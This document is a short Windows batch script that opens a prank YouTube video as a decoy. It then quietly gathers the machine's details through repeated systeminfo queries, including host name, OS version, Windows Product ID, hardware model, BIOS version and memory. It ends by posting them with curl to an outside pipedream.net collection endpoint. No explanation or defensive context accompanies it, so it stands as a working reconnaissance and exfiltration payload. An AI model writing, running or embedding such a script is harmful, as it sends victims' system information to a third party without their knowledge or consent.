ECHO OFF
REM code execution here
START chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"Host Name"') do set "host_name=%%i"
set "host_name=%host_name:~17%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"OS Name"') do set "os_name=%%i"
set "os_name=%os_name:~19%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"OS Version"') do set "os_version=%%i"
set "os_version=%os_version:~14%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"Product ID"') do set "product_id=%%i"
set "product_id=%product_id:~16%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Boot Time"') do set "system_boot_time=%%i"
set "system_boot_time=%system_boot_time:~10%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Manufacturer"') do set "system_manufacturer=%%i"
set "system_manufacturer=%system_manufacturer:~7%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Model"') do set "system_model=%%i"
set "system_model=%system_model:~14%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Type"') do set "system_type=%%i"
set "system_type=%system_type:~15%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"Processor(s)"') do set "processors=%%i"
set "processors=%processors:~14%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"BIOS Version"') do set "bios_version=%%i"
set "bios_version=%bios_version:~14%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"System Locale"') do set "system_locale=%%i"
set "system_locale=%system_locale:~13%"
for /f "tokens=2 delims=:" %%i in ('systeminfo ^| findstr /C:"Total Physical Memory"') do set "total_physical_memory=%%i"
set "total_physical_memory=%total_physical_memory:~5%"
curl -d "{'Host Name':'%host_name%', 'OS Name':'%os_name%', 'OS Version':'%os_version%', 'Product ID':'%product_id%', 'System Boot Time':'%system_boot_time%', 'System Manufacturer':'%system_manufacturer%', 'System Model':'%system_model%', 'System Type':'%system_type%', 'Processor(s)':'%processors%', 'BIOS Version':'%bios_version%', 'System Locale':'%system_locale%', 'Total Physical Memory':'%total_physical_memory%'}" https://eojlk5hggkgar9y.m.pipedream.net/
 
